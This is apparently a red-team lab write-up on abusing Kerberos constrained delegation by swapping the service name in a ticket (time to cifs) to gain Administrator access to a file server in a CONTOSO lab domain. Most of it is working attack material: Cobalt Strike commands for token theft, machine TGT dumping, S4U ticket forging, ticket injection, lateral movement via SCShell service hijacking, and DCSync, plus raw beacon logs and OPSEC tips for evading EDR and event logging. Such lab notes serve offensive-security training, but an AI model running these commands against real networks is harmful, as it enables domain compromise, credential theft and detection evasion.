# Constrained Delegation with Service Name Substitution Kerberos Lab

>The objective of this lab is to abuse constrained delegation using an alternate service name.

**Concept:** When constrained delegation is configured for a non-CIFS service (e.g. `time/lon-fs-1`), a service ticket for that SPN can have its service class swapped in the unencrypted portion of the ticket (e.g. `time` → `cifs`). The target server only validates the encrypted portion — it never checks the SPN in the unencrypted PAC — so the substituted ticket is accepted. This turns a restricted delegation into full file system access without needing CIFS in `msDS-AllowedToDelegateTo`.

===

## Enumeration

1. Launch Cobalt Strike and connect to the team server.
2. Find constrained delegation targets — note the value in `msDS-AllowedToDelegateTo` (e.g. `time/lon-fs-1`). You will need the exact SPN in the exploitation step.  

```Beacon-nocolor
ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl
```

> OPSEC-🟢SAFE — BOF, runs in beacon thread, no child process.

⚠️ Expected output: `lon-ws-1$` with `msDS-AllowedToDelegateTo: time/lon-fs-1`. The service is `time`, not `cifs` — that is the point of this lab.

## Lateral Movement to lon-ws-1

Goal: get a beacon running as SYSTEM on `lon-ws-1` so we can access the machine account logon session (LUID `0x3e7`) and dump its TGT.

1. Find a process owned by `rsteel` (Workstation Admin on lon-ws-1):

```cs
ps
// Look for cmd.exe, mmc.exe owned by CONTOSO\rsteel
```

2. Steal the token:

```cs
steal_token <rsteel-pid>    // OPSEC-🟢SAFE — no logon event, no child process
getuid                       // confirm CONTOSO\rsteel
```

3. Set spawnto before jumping:

```cs
ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
// dllhost.exe = COM surrogate — blends with normal system activity
// Standard CS equivalent if ak-settings not loaded:
spawnto x64 %windir%\sysnative\dllhost.exe
```

4. Jump to lon-ws-1

```cs
jump scshell64 lon-ws-1 smb

rev2self    // drop rsteel token on source beacon after jump succeeds
```

5. On the new lon-ws-1 beacon — verify SYSTEM context:

```cs
getuid
```


## Exploitation

### Step 1 — Dump the machine account TGT

LUID `0x3e7` is the machine account logon session — always present on any domain-joined host, always SYSTEM-accessible.

```cs
krb_dump /luid:3e7 /service:krbtgt
```

> OPSEC-🟠CAUTION — BOF, uses `LsaCallAuthenticationPackage` Kerberos API — not a raw LSASS memory read, but EDR hooks on this API will still fire.

> ⚠️ **Lab-confirmed (2026-04-19):** Use `/luid:3e7` — do NOT prefix with `0x`. Kerbeus-BOF rejects `/luid:0x3e7` and returns `[x] Invalid luid`.

⚠️ Copy the entire base64 TGT blob — pass it to `krb_s4u` next.

> ```cs
> beacon> krb_dump /user:Administrator /service:krbtgt
> ```
> Lab confirmed (2026-04-19): Administrator TGT was cached on lon-ws-1 at LUID `0x7940d`. Direct DA path — no delegation abuse required.

>Verify ticket before using:  

```cs
beacon> krb_describe /ticket:[base64-TGT]    // OPSEC-🟢SAFE — BOF, read-only
```


### Step 2 — S4U abuse with service name substitution

Use the machine TGT to request a service ticket for the delegated SPN (`time/lon-fs-1`), then substitute the service class to `cifs`. The resulting ticket is valid for `cifs/lon-fs-1` impersonating Administrator.

```Beacon-nocolor
krb_s4u /ticket:[base64-TGT-output-from-krb_dump_3e7] /service:time/lon-fs-1 /altservice:cifs /impersonateuser:Administrator
```

> OPSEC-🟢SAFE — `krb_s4u` is a BOF. Runs in beacon thread, no child process, no disk write.

⚠️ `/service:time/lon-fs-1` must exactly match the value in `msDS-AllowedToDelegateTo` from enumeration — if the delegation target is different in your lab, substitute accordingly.

⚠️ `/altservice:cifs` replaces the service class in the unencrypted ticket header. The KDC-signed encrypted portion is unchanged — the target host accepts it.

⚠️ `krb_s4u` outputs a base64-encoded service ticket. Copy the full base64 string from the beacon output — you need it in Step 3.

---

### Step 3 — Save the service ticket on the attacker machine

>Run this on the attacker CS client (local PowerShell — **not** via beacon):

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs-lon-fs-1.kirbi", [Convert]::FromBase64String("[BASE64-SERVICE-TICKET_output_from_KRB_s4u_beacon]"))
```

> The `.kirbi` file is written to your **attacker desktop only** — nothing touches the target's disk. `kerberos_ticket_use` reads from the CS client and injects over the C2 channel.

---

### Step 4 — Inject the ticket and access the share

Back in the beacon on `lon-ws-1`:

```cs
// make_token is OPTIONAL when beacon is SYSTEM — lab-confirmed (2026-04-19)
// kerberos_ticket_use injects directly into the SYSTEM logon session
// lon-fs-1 sees Administrator authenticating regardless of local session identity

// Option A — skip make_token (OPSEC-🟢SAFE — no Event 4648, lab-confirmed working)

kerberos_ticket_use C:\Users\Attacker\Desktop\cifs-lon-fs-1.kirbi
ls \\lon-fs-1\c$\users

// Option B — with make_token (OPSEC-🟠CAUTION — Event 4648 logged, cleaner session)

make_token CONTOSO\Administrator FakePass!
kerberos_ticket_use C:\Users\Attacker\Desktop\cifs-lon-fs-1.kirbi
ls \\lon-fs-1\c$
```

> **Why Option A works:** The injected `cifs/lon-fs-1` service ticket is presented to lon-fs-1 during the network auth. The remote server only validates the Kerberos ticket — it never checks what the local logon session identity is. SYSTEM context is sufficient to hold and present the injected ticket.

⚠️ If `ls \\lon-fs-1\c$` returns `ACCESS_DENIED`:
- `krb_triage` — confirm `cifs/lon-fs-1` ticket is present in current session
- Verify SPN in `krb_s4u` exactly matches `msDS-AllowedToDelegateTo` from ldapsearch
- Check ticket expiry with `krb_describe /ticket:[base64]`


>Raw Beacon log commands and output:  

```
[05/22 08:38:15] beacon> ls \\lon-fs-1\c$\users
[05/22 08:38:15] [*] Tasked beacon to list files in \\lon-fs-1\c$\users
[05/22 08:38:19] [+] host called home, sent: 45 bytes
[05/22 08:38:19] [*] Listing: \\lon-fs-1\c$\users\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     01/24/2025 14:18:02   Administrator
          dir     05/08/2021 08:34:03   All Users
          dir     01/23/2025 13:47:37   Default
          dir     05/08/2021 08:34:03   Default User
          dir     01/23/2025 13:48:37   Public
 174b     fil     05/08/2021 08:18:31   desktop.ini

[05/22 08:38:52] beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
[05/22 08:38:52] [*] Updating the spawnto_x64 process to 'C:\Windows\System32\svchost.exe'
[05/22 08:38:52] [*] artifact kit settings:
[05/22 08:38:52] [*]    service     = ''
[05/22 08:38:52] [*]    spawnto_x86 = 'C:\Windows\SysWOW64\rundll32.exe'
[05/22 08:38:52] [*]    spawnto_x64 = 'C:\Windows\System32\svchost.exe'
[05/22 08:39:32] beacon> jump scshell64 lon-fs-1 smb
[05/22 08:39:32] [*] Tasked beacon to jump to lon-fs-1 (windows/beacon_bind_pipe (\\.\pipe\TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337)) via SCShell
[05/22 08:39:34] [*] Tasked beacon to upload \\lon-fs-1\C$\Windows\System32\evil95.exe as \\lon-fs-1\C$\Windows\System32\evil95.exe
[05/22 08:39:34] [*] Running BOF SCShell (scshellbof.x64.o)
[05/22 08:39:34] [*] Tasked beacon to remove \\lon-fs-1\C$\Windows\System32\evil95.exe
[05/22 08:39:36] [+] host called home, sent: 427396 bytes
[05/22 08:40:25] [+] received output:
Trying to connect to lon-fs-1

[05/22 08:40:25] [+] received output:
SC_HANDLE Manager 0x00000222180CC170

[05/22 08:40:25] [+] received output:
Opening defragsvc

[05/22 08:40:25] [+] received output:
SC_HANDLE Service 0x00000222180CBCC0

[05/22 08:40:25] [+] received output:
LPQUERY_SERVICE_CONFIGA need 0x00000142 bytes

[05/22 08:40:25] [+] received output:
Original service binary path "C:\Windows\system32\svchost.exe -k defragsvc"

[05/22 08:40:25] [+] received output:
Service path was changed to "C:\Windows\System32\evil95.exe"

[05/22 08:40:25] [+] received output:
Service was started

[05/22 08:40:25] [+] received output:
Service path was restored to "C:\Windows\system32\svchost.exe -k defragsvc"

[05/22 08:40:25] [+] established link to child beacon: 10.10.120.15
[05/22 08:40:58] beacon> 

```

## LON-FS-1 Enumeration

>Raw Beacon log commands and output:  

```
[05/22 08:40:25] [+] established link to parent beacon: 10.10.120.10
[05/22 08:41:50] beacon> getuid
[05/22 08:41:50] [*] Tasked beacon to get userid
[05/22 08:41:52] [+] host called home, sent: 16 bytes
[05/22 08:41:52] [*] You are NT AUTHORITY\SYSTEM (admin)
[05/22 08:41:54] beacon> sleep 5 5
[05/22 08:41:54] [*] Tasked beacon to sleep for 5s (5% jitter) [change made to: Beacon 10.10.121.108@11552]
[05/22 08:41:57] beacon> ps
[05/22 08:41:57] [*] Tasked beacon to list processes
[05/22 08:41:57] [+] host called home, sent: 20 bytes
[05/22 08:41:57] [*] Process List

[*] This Beacon PID:    YELLOW 4836  
 PID   PPID  Name                                   Arch  Session     User
 ---   ----  ----                                   ----  -------     ----
 0     0     [System Process]                                         
 4     0         System                             x64   0           NT AUTHORITY\SYSTEM
 96    4             Registry                       x64   0           NT AUTHORITY\SYSTEM
 372   4             smss.exe                       x64   0           NT AUTHORITY\SYSTEM
 572   556   csrss.exe                                                
 636   556   winlogon.exe                           x64   1           NT AUTHORITY\SYSTEM
 860   636       fontdrvhost.exe                    x64   1           Font Driver Host\UMFD-1
 1064  636       dwm.exe                            x64   1           Window Manager\DWM-1
 3444  636       LogonUI.exe                        x64   1           NT AUTHORITY\SYSTEM
 4836  6908  svchost.exe                            x64   0           NT AUTHORITY\SYSTEM
 4980  2276  MicrosoftEdgeUpdate.exe                x86   0           NT AUTHORITY\SYSTEM

[05/22 08:42:15] beacon> krb_triage
[05/22 08:42:15] [+] Kerbeus TRIAGE by RalfHacker
[05/22 08:42:17] [+] host called home, sent: 13665 bytes
[05/22 08:42:17] [+] received output:

Action: List Kerberos Tickets (All Users)


-----------------------------------------------------------------------------------------------------------
| LUID        | Client | Service | End Time |
-----------------------------------------------------------------------------------------------------------
| 0:0x3e4     | lon-fs-1$ @ CONTOSO.COM                  | krbtgt/CONTOSO.COM                       | 22.05.2026 18:23:44 |
| 0:0x3e4     | lon-fs-1$ @ CONTOSO.COM                  | krbtgt/CONTOSO.COM                       | 22.05.2026 18:23:44 |
| 0:0x3e4     | lon-fs-1$ @ CONTOSO.COM                  | cifs/lon-dc-1.contoso.com                | 22.05.2026 18:23:44 |
| 0:0x140df1  | Administrator @ CONTOSO.COM              | cifs/lon-fs-1                            | 22.05.2026 09:35:36 |
| 0:0x3e7     | lon-fs-1$ @ CONTOSO.COM                  | krbtgt/CONTOSO.COM                       | 22.05.2026 18:23:13 |
| 0:0x3e7     | lon-fs-1$ @ CONTOSO.COM                  | krbtgt/CONTOSO.COM                       | 22.05.2026 18:23:13 |
| 0:0x3e7     | lon-fs-1$ @ CONTOSO.COM                  | cifs/lon-dc-1.contoso.com/contoso.com    | 22.05.2026 18:23:13 |
| 0:0x3e7     | lon-fs-1$ @ CONTOSO.COM                  | LON-FS-1$                                | 22.05.2026 18:23:13 |
| 0:0x3e7     | lon-fs-1$ @ CONTOSO.COM                  | LDAP/lon-dc-1.contoso.com                | 22.05.2026 18:23:13 |
| 0:0x3e7     | lon-fs-1$ @ CONTOSO.COM                  | ldap/lon-dc-1.contoso.com/contoso.com    | 22.05.2026 18:23:13 |


```


## Lateral Movement to LON-DC-1 (INCOMPLETE...)

**Step 1 — Check for a DA process to steal (fastest path)**

```cs
ps
// Look for any process owned by CONTOSO\Administrator or other DA
steal_token <admin-pid>
getuid
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
jump scshell64 lon-dc-1 smb
```

**Step 2 — If no DA process, dump machine TGT + S4U to DC**

First confirm lon-fs-1 has constrained delegation configured to lon-dc-1:

```cs
ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo
```

If delegation to lon-dc-1 is present, dump the machine TGT and request a CIFS ticket impersonating Administrator:

```cs
krb_dump /luid:3e7 /service:krbtgt
// Copy base64 TGT blob

krb_s4u /ticket:[BASE64-TGT] /service:cifs/lon-dc-1 /impersonateuser:Administrator
```

Save and inject the service ticket on attacker desktop:

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs-lon-dc-1.kirbi", [Convert]::FromBase64String("[BASE64-SERVICE-TICKET]"))
```

```cs
kerberos_ticket_use C:\Users\Attacker\Desktop\cifs-lon-dc-1.kirbi
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
jump scshell64 lon-dc-1 smb
```

**Step 3 — If no delegation config, attempt DCSync (requires replication rights)**

```cs
dcsync contoso.com CONTOSO\krbtgt
```

**New beacon OPSEC on LON-DC-1 (run immediately after connect)**

```cs
sleep 5 21
ps
ppid <svchost PID owned by SYSTEM>
spawnto x64 C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
getuid
```

### Lab-Confirmed Results — 2026-05-22

**Step 1 result:** `ps` on LON-FS-1 showed only SYSTEM processes — no DA user session present. `steal_token` path not available.

**Step 2 result — S4U2proxy FAILED (Kerberos error 13)**

S4U2self succeeded (self-ticket for Administrator to `LON-FS-1$` obtained), but S4U2proxy returned `[x] Kerberos error : 13` (`KDC_ERR_BADOPTION`). LON-FS-1 has no `msDS-AllowedToDelegateTo` entry for `cifs/lon-dc-1` — the KDC rejected the proxy request. The machine account CIFS tickets visible in `krb_triage` at LUID `0x3e7` and `0x3e4` are normal AD operational tickets, NOT a delegation path.

```
[*] Building S4U2proxy request for service: 'cifs/lon-dc-1'
    [x] Kerberos error : 13
```

⚠️ **Key lesson:** Seeing `cifs/lon-dc-1` cached in `krb_triage` does NOT mean S4U2proxy will work — those are machine-initiated service tickets from normal AD operations, not delegation grants. Always confirm delegation config with `ldapsearch` before attempting S4U.

**Step 3 result — DCSync FAILED (access denied)**

```
ERROR kuhl_m_lsadump_dcsync ; GetNCChanges: 0x000020f7 (8439)
```

`0x20f7 = ERROR_DS_DRA_ACCESS_DENIED` — SYSTEM on a file server has no replication privileges. DCSync requires DA, Domain Controllers group, or explicit replication ACL on the domain NC head.

**Conclusion:** LON-FS-1 is a dead end for reaching LON-DC-1 directly. In the full kill chain the DC is reached via Golden Ticket from other-DC-1 after completing the Dublin domain path — not laterally from FS-1.

---

## Cleanup  

```cs
beacon> rev2self
beacon> kerberos_ticket_purge    // purge injected ticket from SYSTEM session
```

===

⚠️ In this lab, you abused constrained delegation with service name substitution — taking a delegation configured only for `time/lon-fs-1` and turning it into a usable `cifs/lon-fs-1` ticket impersonating a Domain Admin, without ever touching LSASS directly or requiring the Administrator's credentials.
